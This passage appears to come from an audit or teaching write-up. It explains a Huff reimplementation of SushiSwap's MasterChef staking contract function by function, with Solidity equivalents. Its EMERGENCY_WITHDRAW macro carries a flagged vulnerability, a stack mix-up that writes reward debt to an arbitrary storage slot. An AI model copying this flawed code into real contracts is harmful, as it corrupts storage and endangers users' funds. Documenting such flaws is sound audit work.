        // Stack: [(user.amount * pool.accSushiPerShare) / 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]

        SAFE_SUB() // takes(2) returns(1)
        // Stack: [pending, user.amount, user_slot, pool_slot, pid, amount]
        // pending = (user.amount * pool.accSushiPerShare) / 1e12 - user.rewardDebt

        caller
        // Stack: [msg.sender, pending, user.amount, user_slot, pool_slot, pid, amount]

        SAFE_SUSHI_TRANSFER(0x00)  // takes(2) returns(0)
        // Stack: [user.amount, user_slot, pool_slot, pid, amount]
        // Transfers 'pending' SUSHI to msg.sender

    user_amount_zero_jump:
    // Stack: [user.amount, user_slot, pool_slot, pid, amount]

    // ===== Transfer LP Tokens from User =====
    dup3 sload
    // Stack: [pool.lpToken, user.amount, user_slot, pool_slot, pid, amount]
    // Loaded from pool_slot + 0

    dup6 address caller
    // Stack: [msg.sender, this, amount, pool.lpToken, user.amount, user_slot, pool_slot, pid, amount]
    // dup6 duplicates amount, address pushes address(this), caller pushes msg.sender

    SAFE_TRANSFER_FROM(0x00) // takes(4) returns(0)
    // Stack: [user.amount, user_slot, pool_slot, pid, amount]
    // Transfers 'amount' LP tokens from msg.sender to this contract

    // ===== Update user.amount =====
    dup1 dup6 SAFE_ADD()
    // Stack: [user.amount + amount, user.amount, user_slot, pool_slot, pid, amount]

    dup3 sstore
    // Stack: [user.amount, user_slot, pool_slot, pid, amount]
    // Stores new user.amount to user_slot

    // ===== Calculate and Store new user.rewardDebt =====
    [E] swap1
    // Stack: [user.amount + amount, 1e12, user_slot, pool_slot, pid, amount]

    dup4 0x03 add sload
    // Stack: [pool.accSushiPerShare, user.amount + amount, 1e12, user_slot, pool_slot, pid, amount]

    SAFE_MUL() SAFE_DIV()
    // Stack: [(user.amount + amount) * pool.accSushiPerShare / 1e12, user_slot, pool_slot, pid, amount]
    // This is the new rewardDebt

    dup2 0x01 add sstore
    // Stack: [user_slot, pool_slot, pid, amount]
    // Stores new rewardDebt to user_slot + 1

    // ===== Cleanup and Emit Event =====
    pop pop swap1
    // Stack: [amount, pid]

    0x00 mstore
    // Stack: [pid]
    // Stores amount at memory[0x00] for event data

    caller
    // Stack: [msg.sender, pid]

    __EVENT_HASH(Deposit)
    // Stack: [event_sig, msg.sender, pid]

    0x20 0x00 log3
    // Stack: []
    // Emits: Deposit(msg.sender, pid, amount)

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: deposit()") %}
```solidity
function deposit(uint256 pid, uint256 amount) external {
    PoolInfo storage pool = poolInfo[pid];
    UserInfo storage user = userInfo[pid][msg.sender];
    updatePool(pid);

    if (user.amount > 0) {
        uint256 pending = user.amount * pool.accSushiPerShare / 1e12 - user.rewardDebt;
        safeSushiTransfer(msg.sender, pending);
    }

    pool.lpToken.safeTransferFrom(msg.sender, address(this), amount);
    user.amount = user.amount + amount;
    user.rewardDebt = user.amount * pool.accSushiPerShare / 1e12;

    emit Deposit(msg.sender, pid, amount);
}
```
{%end%}

The Solidity version abstracts the reward calculation and storage updates into cleaner syntax with automatic handling of storage references and event emission.

---

#### WITHDRAW() - Unstake LP Tokens and Claim Rewards

Withdraws staked LP tokens from a pool and claims pending rewards. This function follows a similar pattern to DEPOSIT() but in reverse, introducing the `sub` opcode for subtraction and the `SAFE_TRANSFER()` macro which transfers ERC20 tokens from the contract to the user (opposite direction from `SAFE_TRANSFER_FROM()`). The function validates the withdrawal amount, claims any pending rewards, decreases the user's staked amount, updates the reward debt, and transfers the LP tokens back to the user.

{% note(clickable=true, hidden=true, header="Huff Code: WITHDRAW()") %}
```huff
#define macro WITHDRAW() = takes(0) returns(0) {
    // Stack: []
    0x24 calldataload
    // Stack: [amount]

    0x04 calldataload
    // Stack: [pid, amount]

    dup1 CHECK_PID()  // takes(1) returns(0) - validates pid < poolLength
    // Stack: [pid, amount]

    caller dup2
    // Stack: [pid, msg.sender, pid, amount]

    [USER_INFO_SLOT]
    // Stack: [USER_INFO_SLOT, pid, msg.sender, pid, amount]

    GET_SLOT_FROM_KEYS_2D(0x00) // takes(3) returns(1) - calculates userInfo[pid][msg.sender] slot
    // Stack: [user_slot, pid, amount]

    dup1 sload
    // Stack: [user.amount, user_slot, pid, amount]

    dup1 dup5 gt
    // Stack: [amount > user.amount, user.amount, user_slot, pid, amount]

    iszero
    // Stack: [amount <= user.amount, user.amount, user_slot, pid, amount]

    continue_jump jumpi  // if amount <= user.amount, continue
    // Stack: [user.amount, user_slot, pid, amount]

    // ===== Revert if withdrawing more than deposited =====
        __ERROR(WithdrawNotGood) 0x00 mstore
        // Stack: [user.amount, user_slot, pid, amount]

        0x04 0x00 revert
        // Execution stops here if validation fails

    continue_jump:
    // Stack: [user.amount, user_slot, pid, amount]

    // ===== Update Pool Rewards =====
    dup3
    // Stack: [pid, user.amount, user_slot, pid, amount]

    INNER_UPDATE_POOL()  // takes(1) returns(0) - updates pool rewards
    // Stack: [user.amount, user_slot, pid, amount]

    dup3 GET_POOL_SLOT(0x00)  // takes(1) returns(1)
    // Stack: [pool_slot, user.amount, user_slot, pid, amount]

    // ===== Claim Pending Rewards =====
    dup2 dup4 0x01 add sload
    // Stack: [user.rewardDebt, user.amount, pool_slot, user.amount, user_slot, pid, amount]
    // Loaded from user_slot + 1

    [E] dup4 0x03 add sload
    // Stack: [pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, pool_slot, user.amount, user_slot, pid, amount]
    // Loaded from pool_slot + 3

    dup1 swap4
    // Stack: [user.amount, pool.accSushiPerShare, 1e12, user.rewardDebt, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]

    SAFE_MUL() SAFE_DIV() SAFE_SUB()
    // Stack: [pending, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
    // pending = (user.amount * pool.accSushiPerShare) / 1e12 - user.rewardDebt

    caller
    // Stack: [msg.sender, pending, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]

    SAFE_SUSHI_TRANSFER(0x00)  // takes(2) returns(0)
    // Stack: [pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
    // Transfers 'pending' SUSHI to msg.sender

    // ===== Update user.amount =====
    dup6 dup4 sub
    // Stack: [user.amount - amount, pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]

    dup5 sstore
    // Stack: [pool.accSushiPerShare, pool_slot, user.amount, user_slot, pid, amount]
    // Stores new user.amount (old amount - withdrawal) to user_slot

    // ===== Calculate and Store new user.rewardDebt =====
    [E] swap1 dup4
    // Stack: [user.amount - amount, pool.accSushiPerShare, 1e12, pool_slot, user.amount, user_slot, pid, amount]

    SAFE_MUL() SAFE_DIV()
    // Stack: [(user.amount - amount) * pool.accSushiPerShare / 1e12, pool_slot, user.amount, user_slot, pid, amount]
    // This is the new rewardDebt

    dup4 0x01 add sstore
    // Stack: [pool_slot, user.amount, user_slot, pid, amount]
    // Stores new rewardDebt to user_slot + 1

    // ===== Transfer LP Tokens Back to User =====
    sload dup5 caller
    // Stack: [msg.sender, amount, pool.lpToken, user.amount, user_slot, pid, amount]
    // Loaded pool.lpToken from pool_slot

    SAFE_TRANSFER(0x00)  // takes(3) returns(0)
    // Stack: [pid, amount]
    // Transfers 'amount' LP tokens from contract to msg.sender

    // ===== Emit Event =====
    swap3 0x00 mstore
    // Stack: [amount, pid]
    // Stores amount at memory[0x00] for event data

    pop caller
    // Stack: [msg.sender, pid]

    __EVENT_HASH(Withdraw)
    // Stack: [event_sig, msg.sender, pid]

    0x20 0x00 log3
    // Stack: []
    // Emits: Withdraw(msg.sender, pid, amount)

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: withdraw()") %}
```solidity
function withdraw(uint256 pid, uint256 amount) external {
    PoolInfo storage pool = poolInfo[pid];
    UserInfo storage user = userInfo[pid][msg.sender];

    require(user.amount >= amount, "WithdrawNotGood");

    updatePool(pid);

    uint256 pending = user.amount * pool.accSushiPerShare / 1e12 - user.rewardDebt;
    safeSushiTransfer(msg.sender, pending);

    user.amount = user.amount - amount;
    user.rewardDebt = user.amount * pool.accSushiPerShare / 1e12;

    pool.lpToken.safeTransfer(msg.sender, amount);

    emit Withdraw(msg.sender, pid, amount);
}
```
{%end%}

Solidity's require statement provides cleaner error handling than manual revert operations.

---

#### PENDING_SUSHI() - Calculate Pending Rewards

View function that calculates pending SUSHI rewards for a user without modifying state. This function introduces the `number` opcode which retrieves the current block number, `lt` for less-than comparison, `and` for bitwise AND operations enabling complex conditional checks, and `jump` for unconditional control flow jumps. The function implements sophisticated conditional logic with multiple jump labels to handle different reward calculation scenarios: if the pool hasn't been updated since the last reward block or has zero LP supply, it uses the existing accSushiPerShare; otherwise, it calculates an updated accSushiPerShare value by fetching the LP token balance, computing the block multiplier using `INNER_GET_MULTIPLIER()`, and calculating new rewards. The final pending reward is derived from the user's staked amount, the (potentially updated) accSushiPerShare, and their reward debt.

{% note(clickable=true, hidden=true, header="Huff Code: PENDING_SUSHI()") %}
```huff
#define macro PENDING_SUSHI() = takes(0) returns(0) {
    // Stack: []
    0x04 calldataload
    // Stack: [pid]

    dup1 CHECK_PID()  // takes(1) returns(0)
    // Stack: [pid]

    GET_POOL_SLOT(0x00)  // takes(1) returns(1)
    // Stack: [pool_slot]

    dup1 0x03 add sload
    // Stack: [pool.accSushiPerShare, pool_slot]

    dup2 sload
    // Stack: [pool.lpToken, pool.accSushiPerShare, pool_slot]

    address
    // Stack: [this, pool.lpToken, pool.accSushiPerShare, pool_slot]
    // Pushes address(this) onto the stack

    ERC20_BALANCE_OF(0x00)  // takes(2) returns(1)
    // Stack: [lpSupply, pool.accSushiPerShare, pool_slot]
    // Calls pool.lpToken.balanceOf(address(this))

    dup3 0x02 add sload
    // Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

    dup1 number gt
    // Stack: [currentBlock > lastRewardBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

    dup3 iszero iszero
    // Stack: [lpSupply != 0, currentBlock > lastRewardBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

    and iszero
    // Stack: [!((currentBlock > lastRewardBlock) && (lpSupply != 0)), pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

    condition_is_false_jump jumpi
    // Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

    // ===== Calculate Updated accSushiPerShare =====
        number
        // Stack: [currentBlock, pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]

        INNER_GET_MULTIPLIER()  // takes(2) returns(1)
        // Stack: [multiplier, lpSupply, pool.accSushiPerShare, pool_slot]

        [SUSHI_PER_BLOCK_SLOT] sload
        // Stack: [sushiPerBlock, multiplier, lpSupply, pool.accSushiPerShare, pool_slot]

        SAFE_MUL()  // takes(2) returns(1)
        // Stack: [sushiReward, lpSupply, pool.accSushiPerShare, pool_slot]

        dup4 0x01 add sload
        // Stack: [pool.allocPoint, sushiReward, lpSupply, pool.accSushiPerShare, pool_slot]

        SAFE_MUL()  // takes(2) returns(1)
        // Stack: [sushiReward * allocPoint, lpSupply, pool.accSushiPerShare, pool_slot]

        [TOTAL_ALLOC_POINT_SLOT] sload
        // Stack: [totalAllocPoint, sushiReward * allocPoint, lpSupply, pool.accSushiPerShare, pool_slot]

        swap1 SAFE_DIV()  // takes(2) returns(1)
        // Stack: [poolReward, lpSupply, pool.accSushiPerShare, pool_slot]

        [E] SAFE_MUL() SAFE_DIV()  // takes(4) returns(1)
        // Stack: [poolReward * 1e12 / lpSupply, pool.accSushiPerShare, pool_slot]

        SAFE_ADD()  // takes(2) returns(1)
        // Stack: [updatedAccSushiPerShare, pool_slot]

        swap1 pop
        // Stack: [updatedAccSushiPerShare]

        end_jump jump

    condition_is_false_jump:
    // Stack: [pool.lastRewardBlock, lpSupply, pool.accSushiPerShare, pool_slot]
        pop pop
        // Stack: [pool.accSushiPerShare, pool_slot]

        swap1 pop
        // Stack: [pool.accSushiPerShare]

    end_jump:
    // Stack: [accSushiPerShare] (either original or updated)

    // ===== Calculate User's Pending Rewards =====
    [E]
    // Stack: [1e12, accSushiPerShare]

    0x24 calldataload
    // Stack: [user, 1e12, accSushiPerShare]

    0x04 calldataload
    // Stack: [pid, user, 1e12, accSushiPerShare]

    [USER_INFO_SLOT]
    // Stack: [USER_INFO_SLOT, pid, user, 1e12, accSushiPerShare]

    GET_SLOT_FROM_KEYS_2D(0x00)  // takes(3) returns(1)
    // Stack: [user_slot, 1e12, accSushiPerShare]

    dup1 sload
    // Stack: [user.amount, user_slot, 1e12, accSushiPerShare]

    swap1 0x01 add sload
    // Stack: [user.rewardDebt, user.amount, 1e12, accSushiPerShare]

    swap3
    // Stack: [accSushiPerShare, user.amount, 1e12, user.rewardDebt]

    SAFE_MUL() SAFE_DIV() SAFE_SUB()  // takes(4) returns(1)
    // Stack: [pending]
    // pending = (user.amount * accSushiPerShare) / 1e12 - user.rewardDebt

    0x00 mstore
    // Stack: []

    0x20 0x00 return
    // Returns pending reward amount
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent") %}
```solidity
function pendingSushi(uint256 pid, address user) external view returns (uint256) {
    PoolInfo storage pool = poolInfo[pid];
    UserInfo storage user = userInfo[pid][_user];
    uint256 accSushiPerShare = pool.accSushiPerShare;
    uint256 lpSupply = pool.lpToken.balanceOf(address(this));

    if (block.number > pool.lastRewardBlock && lpSupply != 0) {
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 sushiReward = multiplier * sushiPerBlock * pool.allocPoint / totalAllocPoint;
        accSushiPerShare = accSushiPerShare + sushiReward * 1e12 / lpSupply;
    }

    return user.amount * accSushiPerShare / 1e12 - user.rewardDebt;
}
```
{%end%}

---

**MASS_UPDATE_POOLS() - Update All Pools**

Updates reward variables for all pools by iterating through them. This function demonstrates how to implement loops in low-level EVM code using jump labels and conditional jumps, introducing iteration counter management with explicit stack-based loop variables. The function loads the total pool count, initializes a counter to zero, and uses labeled jumps (start_jump, continue_jump, end_jump) to create a loop structure that calls `INNER_UPDATE_POOL()` for each pool index from 0 to poolLength-1, incrementing the counter after each iteration until all pools are updated.

{% note(clickable=true, hidden=true, header="Huff Code: MASS_UPDATE_POOLS") %}
```huff
#define macro MASS_UPDATE_POOLS() = takes(0) returns(0) {
    // Stack: []
    [POOL_INFO_SLOT] sload
    // Stack: [poolLength]

    dup1 iszero
    // Stack: [poolLength == 0, poolLength]

    end_jump jumpi
    // If no pools exist, jump to end

    // ===== Initialize Loop =====
    0x00
    // Stack: [0, poolLength]
    // Initialize counter i = 0

    start_jump jump
    // Jump to loop start

    continue_jump:
    // Stack: [i, poolLength]
        eq end_jump jumpi
        // If i == poolLength, exit loop

        start_jump:
        // Stack: [i, poolLength]
        dup1
        // Stack: [i, i, poolLength]

        INNER_UPDATE_POOL()  // takes(1) returns(0)
        // Stack: [i, poolLength]
        // Updates pool at index i

        0x01 add
        // Stack: [i+1, poolLength]

        dup2 dup2
        // Stack: [i+1, poolLength, i+1, poolLength]

        continue_jump jump

    end_jump:
    // Stack: [poolLength, poolLength] or [poolLength] depending on path
    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent") %}
```solidity
function massUpdatePools() external {
    uint256 length = poolInfo.length;
    for (uint256 pid = 0; pid < length; pid++) {
        updatePool(pid);
    }
}
```
{%end%}

---

#### UPDATE_POOL() - Update Single Pool

Updates a single pool's reward variables by calling the internal `INNER_UPDATE_POOL()` macro after pool ID validation. The `INNER_UPDATE_POOL()` helper macro implements the core pool update logic with several conditional paths: if the current block hasn't advanced past the pool's lastRewardBlock, it returns early; if the LP token supply is zero, it only updates lastRewardBlock to the current block; otherwise, it performs a full reward calculation by computing the block multiplier, calculating SUSHI rewards earned, minting 10% to the dev address and the full sushiReward amount to address(this) (the Cheff contract itself), updating accSushiPerShare with the new rewards scaled by 1e12 divided by LP supply, and finally storing the updated accSushiPerShare and lastRewardBlock values. The `address` opcode pushes the current contract's address onto the stack.

{% note(clickable=true, hidden=true, header="Huff Code: UPDATE_POOL()") %}
```huff
#define macro UPDATE_POOL() = takes(0) returns(0) {
    // Stack: []
    0x04 calldataload
    // Stack: [pid]

    dup1 CHECK_PID()
    // Stack: [pid]

    INNER_UPDATE_POOL()
    // Stack: []
    // Expands to inline pool update logic below

    stop
}

// INNER_UPDATE_POOL() expansion: takes(1) returns(0)
#define macro INNER_UPDATE_POOL() = takes(1) returns(0) {
    // Stack: [pid]
    GET_POOL_SLOT(0x00)
    // Stack: [pool_slot]
    // Memory[0x00]: used for sha3 computation

    dup1 0x02 add sload
    // Stack: [pool.lastRewardBlock, pool_slot]

    dup1 number gt
    // Stack: [currentBlock > lastRewardBlock, pool.lastRewardBlock, pool_slot]

    block_number_bigger_jump jumpi
    // If currentBlock > lastRewardBlock, jump to update logic
        pop pop
        // Stack: []
        end_jump jump

    block_number_bigger_jump:
    // Stack: [pool.lastRewardBlock, pool_slot]
    swap1 dup1 sload
    // Stack: [pool.lpToken, pool_slot, pool.lastRewardBlock]

    address
    // Stack: [this, pool.lpToken, pool_slot, pool.lastRewardBlock]
    // Pushes address(this) onto the stack

    ERC20_BALANCE_OF(0x00)
    // Stack: [lpSupply, pool_slot, pool.lastRewardBlock]
    // Calls pool.lpToken.balanceOf(address(this))
    // Memory[0x00]: used for ERC20 call encoding

    dup1
    // Stack: [lpSupply, lpSupply, pool_slot, pool.lastRewardBlock]

    lp_supply_not_zero_jump jumpi
    // If lpSupply == 0, only update lastRewardBlock
        pop 0x02 add
        // Stack: [pool_slot + 2, pool.lastRewardBlock]
        number swap1
        // Stack: [pool_slot + 2, currentBlock]
        sstore
        // storage[pool_slot + 2] = currentBlock
        pop
        end_jump jump

    lp_supply_not_zero_jump:
    // Stack: [lpSupply, pool_slot, pool.lastRewardBlock]
    swap2 number
    // Stack: [currentBlock, pool.lastRewardBlock, pool_slot, lpSupply]

    INNER_GET_MULTIPLIER()
    // Stack: [multiplier, pool_slot, lpSupply]

    [SUSHI_PER_BLOCK_SLOT] sload
    // Stack: [sushiPerBlock, multiplier, pool_slot, lpSupply]

    SAFE_MUL()
    // Stack: [multiplier * sushiPerBlock, pool_slot, lpSupply]

    dup2 0x01 add sload
    // Stack: [pool.allocPoint, multiplier * sushiPerBlock, pool_slot, lpSupply]

    SAFE_MUL()
    // Stack: [multiplier * sushiPerBlock * pool.allocPoint, pool_slot, lpSupply]

    [TOTAL_ALLOC_POINT_SLOT] sload swap1
    // Stack: [multiplier * sushiPerBlock * pool.allocPoint, totalAllocPoint, pool_slot, lpSupply]

    SAFE_DIV()
    // Stack: [sushiReward, pool_slot, lpSupply]

    [SUSHI_SLOT] sload dup1
    // Stack: [sushi, sushi, sushiReward, pool_slot, lpSupply]

    0x0a dup4
    // Stack: [sushiReward, 0x0a, sushi, sushi, sushiReward, pool_slot, lpSupply]

    SAFE_DIV()
    // Stack: [sushiReward / 10, sushi, sushi, sushiReward, pool_slot, lpSupply]

    [DEVADDR_SLOT] sload
    // Stack: [devAddr, sushiReward / 10, sushi, sushi, sushiReward, pool_slot, lpSupply]

    SUSHI_MINT(0x00)
    // Stack: [sushi, sushiReward, pool_slot, lpSupply]
    // Mints sushiReward / 10 to devAddr
    // Memory[0x00]: used for mint call encoding

    dup2 address
    // Stack: [address(this), sushiReward, sushi, sushiReward, pool_slot, lpSupply]
    // dup2 duplicates sushiReward, address pushes address(this)

    SUSHI_MINT(0x00)
    // Stack: [sushiReward, pool_slot, lpSupply]
    // Mints sushiReward to address(this) - the Cheff contract
    // Memory[0x00]: used for mint call encoding

    swap1 swap2 swap1
    // Stack: [sushiReward, lpSupply, pool_slot]

    [E]
    // Stack: [1e12, sushiReward, lpSupply, pool_slot]

    SAFE_MUL()
    // Stack: [sushiReward * 1e12, lpSupply, pool_slot]

    SAFE_DIV()
    // Stack: [sushiReward * 1e12 / lpSupply, pool_slot]

    dup2 0x03 add sload
    // Stack: [pool.accSushiPerShare, sushiReward * 1e12 / lpSupply, pool_slot]

    SAFE_ADD()
    // Stack: [pool.accSushiPerShare + (sushiReward * 1e12 / lpSupply), pool_slot]

    dup2 0x03 add
    // Stack: [pool_slot + 3, newAccSushiPerShare, pool_slot]

    sstore
    // Stack: [pool_slot]
    // storage[pool_slot + 3] = newAccSushiPerShare

    number
    // Stack: [currentBlock, pool_slot]

    swap1 0x02 add sstore
    // Stack: []
    // storage[pool_slot + 2] = currentBlock

    end_jump:
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: updatePool()") %}
```solidity
function updatePool(uint256 pid) external {
    _updatePool(pid);
}

function _updatePool(uint256 pid) internal {
    PoolInfo storage pool = poolInfo[pid];

    if (block.number <= pool.lastRewardBlock) {
        return;
    }

    uint256 lpSupply = pool.lpToken.balanceOf(address(this));

    if (lpSupply == 0) {
        pool.lastRewardBlock = block.number;
        return;
    }

    uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
    uint256 sushiReward = multiplier * sushiPerBlock * pool.allocPoint / totalAllocPoint;

    sushi.mint(devaddr, sushiReward / 10);
    sushi.mint(address(this), sushiReward);

    pool.accSushiPerShare = pool.accSushiPerShare + (sushiReward * 1e12 / lpSupply);
    pool.lastRewardBlock = block.number;
}
```
{%end%}

Solidity abstracts the conditional logic and storage operations with cleaner syntax.

---

#### MIGRATE() - Migrate LP Tokens

Migrates LP tokens to a new contract via the migrator contract. This function introduces critical opcodes for external contract interaction: `call` executes a call to another contract with specified gas, address, value, input data, and captures return data; `returndatasize` returns the size of data returned by the last external call; `gas` pushes the remaining gas onto the stack. The function demonstrates external contract calls with return data validation, uses `SAFE_APPROVE()` to approve ERC20 token spending by the migrator contract, and employs `__RIGHTPAD(selector)` to properly format function selectors. The migration process validates the migrator exists, approves the LP token balance to the migrator, calls the migrator's migrate function, verifies the returned new LP token address is valid, and updates the pool to use the new LP token.

{% note(clickable=true, hidden=true, header="Huff Code: MIGRATE()") %}
```huff
#define macro MIGRATE() = takes(0) returns(0) {
    // Stack: []
    [MIGRATOR_SLOT] sload dup1
    // Stack: [migrator, migrator]

    iszero iszero
    // Stack: [migrator != 0, migrator]

    is_not_zero_jump jumpi
    // Stack: [migrator]

    // ===== Revert if No Migrator =====
        __ERROR(NoMigrator) 0x00 mstore
        0x04 0x00 revert

    is_not_zero_jump:
    // Stack: [migrator]

    0x04 calldataload
    // Stack: [pid, migrator]

    dup1 CHECK_PID()  // takes(1) returns(0)
    // Stack: [pid, migrator]

    GET_POOL_SLOT(0x00)  // takes(1) returns(1)
    // Stack: [pool_slot, migrator]

    dup1 sload
    // Stack: [pool.lpToken, pool_slot, migrator]

    dup1 address
    // Stack: [pool.lpToken, pool.lpToken, pool_slot, migrator]

    ERC20_BALANCE_OF(0x00)  // takes(2) returns(1)
    // Stack: [balance, pool.lpToken, pool_slot, migrator]

    dup2 swap1 dup5
    // Stack: [migrator, balance, pool.lpToken, balance, pool.lpToken, pool_slot, migrator]

    SAFE_APPROVE(0x20)  // takes(3) returns(0)
    // Stack: [balance, pool.lpToken, pool_slot, migrator]
    // Approves migrator to spend LP tokens

    // ===== Call Migrator.migrate(lpToken) =====
    __RIGHTPAD(0xce5494bb) 0x20 mstore
    // Stack: [balance, pool.lpToken, pool_slot, migrator]
    // Function selector for migrate(address)

    0x24 mstore
    // Stack: [balance, pool.lpToken, pool_slot, migrator]
    // Stores pool.lpToken as argument at memory[0x24]

    swap1 0x20 0x24 0x20 0x00 0x20
    // Stack: [0x20, 0x00, 0x20, 0x24, 0x20, pool.lpToken, balance, pool_slot, migrator]

    swap5 gas call
    // Stack: [success, pool.lpToken, balance, pool_slot, migrator]
    // Calls migrator.migrate(lpToken) with 32-byte return

    call_success_jump jumpi
    // Stack: [pool.lpToken, balance, pool_slot, migrator]

        __ERROR(CallFailed) <mem_ptr> mstore
        0x04 <mem_ptr> revert

    call_success_jump:
    // Stack: [pool.lpToken, balance, pool_slot, migrator]

    returndatasize
    // Stack: [returnDataSize, pool.lpToken, balance, pool_slot, migrator]

    size_is_not_zero_jump jumpi
    // Stack: [pool.lpToken, balance, pool_slot, migrator]

        __ERROR(ReturnDataSizeIsZero) <mem_ptr> mstore
        0x04 <mem_ptr> revert

    size_is_not_zero_jump:
    // Stack: [pool.lpToken, balance, pool_slot, migrator]

    // ===== Validate New LP Token Balance =====
    0x20 mload
    // Stack: [newLpToken, pool.lpToken, balance, pool_slot, migrator]

    address
    // Stack: [newLpToken, pool.lpToken, balance, pool_slot, migrator]

    ERC20_BALANCE_OF(0x40)  // takes(2) returns(1)
    // Stack: [newBalance, balance, pool_slot, migrator]

    0x00 mload
    // Stack: [oldBalance, newBalance, balance, pool_slot, migrator]

    eq balances_equal_jump jumpi
    // Stack: [balance, pool_slot, migrator]

        __ERROR(ReturnDataSizeIsZero) 0x00 mstore
        0x04 0x00 revert

    balances_equal_jump:
    // Stack: [balance, pool_slot, migrator]

    // ===== Update Pool LP Token =====
    0x20 mload
    // Stack: [newLpToken, balance, pool_slot, migrator]

    swap1 sstore
    // Stack: [pool_slot, migrator]
    // Stores newLpToken to pool_slot

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent : migrate()") %}
```solidity
function migrate(uint256 pid) external {
    require(address(migrator) != address(0), "NoMigrator");
    PoolInfo storage pool = poolInfo[pid];
    address lpToken = address(pool.lpToken);
    uint256 bal = lpToken.balanceOf(address(this));

    lpToken.approve(address(migrator), bal);
    address newLpToken = migrator.migrate(lpToken);

    require(bal == newLpToken.balanceOf(address(this)), "BadMigrate");
    pool.lpToken = newLpToken;
}
```
{%end%}

---

#### DEV() - Update Developer Address

Allows the current developer to update the developer address. This function implements a simple access control pattern where only the current dev address can designate a new dev address, using the `eq` opcode to compare msg.sender with the stored devaddr and conditionally jumping to allow the update or reverting with an Unauthorized error.

{% note(clickable=true, hidden=true, header="Huff Code : DEV()") %}
```huff
#define macro DEV() = takes(0) returns(0) {
    // Stack: []
    [DEVADDR_SLOT] sload
    // Stack: [currentDevAddr]

    caller eq
    // Stack: [msg.sender == currentDevAddr]

    only_dev_jump jumpi
    // Stack: []

    // ===== Revert if Not Developer =====
    __ERROR(Unauthorized) 0x00 mstore
    0x04 0x00 revert

    only_dev_jump:
    // Stack: []

    0x04 calldataload
    // Stack: [newDevAddr]

    [DEVADDR_SLOT] sstore
    // Stack: []
    // Updates developer address

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: dev()") %}
```solidity
function dev(address _devaddr) external {
    require(msg.sender == devaddr, "Unauthorized");
    devaddr = _devaddr;
}
```
{%end%}

Solidity provides the require statement for cleaner access control validation.

---

#### EMERGENCY_WITHDRAW() - Emergency LP Token Withdrawal

Allows users to withdraw all staked LP tokens without claiming rewards in emergency situations. This function is simpler than WITHDRAW() as it skips reward calculations and pool updates, immediately transferring the user's full LP token balance and resetting their state to zero. However, this implementation contains a critical vulnerability in the stack manipulation during the state reset phase.

{% note(clickable=true, hidden=true, header="Huff Code: EMERGENCY_WITHDRAW()") %}
```huff
#define macro EMERGENCY_WITHDRAW() = takes(0) returns(0) {
    // Stack: []
    0x04 calldataload
    // Stack: [pid]

    dup1
    // Stack: [pid, pid]

    CHECK_PID()  // takes(1) returns(0)
    // Stack: [pid]

    caller dup2 [USER_INFO_SLOT]
    // Stack: [USER_INFO_SLOT, pid, msg.sender, pid]

    GET_SLOT_FROM_KEYS_2D(0x00)  // takes(3) returns(1)
    // Stack: [user_slot, pid]
    // Calculates storage slot for userInfo[pid][msg.sender]
    // Memory[0x00]: used for sha3 computation

    dup1 sload
    // Stack: [user.amount, user_slot, pid]

    dup2 0x01 add sload
    // Stack: [user.rewardDebt, user.amount, user_slot, pid]

    dup4
    // Stack: [pid, user.rewardDebt, user.amount, user_slot, pid]

    GET_POOL_SLOT(0x00)  // takes(1) returns(1)
    // Stack: [pool_slot, user.rewardDebt, user.amount, user_slot, pid]
    // Memory[0x00]: used for sha3 computation

    sload
    // Stack: [lpToken, user.rewardDebt, user.amount, user_slot, pid]

    dup3 caller
    // Stack: [msg.sender, user.amount, lpToken, user.rewardDebt, user.amount, user_slot, pid]

    SAFE_TRANSFER(0x00)  // takes(3) returns(0)
    // Stack: [user.rewardDebt, user.amount, user_slot, pid]
    // Transfers user.amount LP tokens from contract to msg.sender
    // Memory[0x00]: used for transfer call encoding

    // ===== Prepare Event Data =====
    dup2 0x00 mstore
    // Stack: [user.rewardDebt, user.amount, user_slot, pid]
    // Memory[0x00]: user.amount (32 bytes) for event data

    swap3 caller
    // Stack: [msg.sender, pid, user.amount, user_slot, user.rewardDebt]

    __EVENT_HASH(EmergencyWithdraw)
    // Stack: [event_sig, msg.sender, pid, user.amount, user_slot, user.rewardDebt]

    0x20 0x00 log3
    // Stack: [user.amount, user_slot, user.rewardDebt]
    // Emits: EmergencyWithdraw(msg.sender indexed, pid indexed, user.amount)

    // ===== Reset User State =====
    0x00
    // Stack: [0x00, user.amount, user_slot, user.rewardDebt]

    swap3
    // Stack: [user.rewardDebt, user.amount, user_slot, 0x00]

    swap1
    // Stack: [user.amount, user.rewardDebt, user_slot, 0x00]

    sstore  // @audit-issue Incorrect stack manipulation
    // Stack: [user_slot, 0x00]
    // storage[user.amount] = user.rewardDebt
    // Writes user.rewardDebt to storage slot number equal to user's staked amount!

    sstore
    // Stack: []
    // storage[user_slot] = 0x00 => user.amount = 0
    // Correctly zeros user.amount

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: emergencyWithdraw()") %}
```solidity
function emergencyWithdraw(uint256 pid) external {
    PoolInfo storage pool = poolInfo[pid];
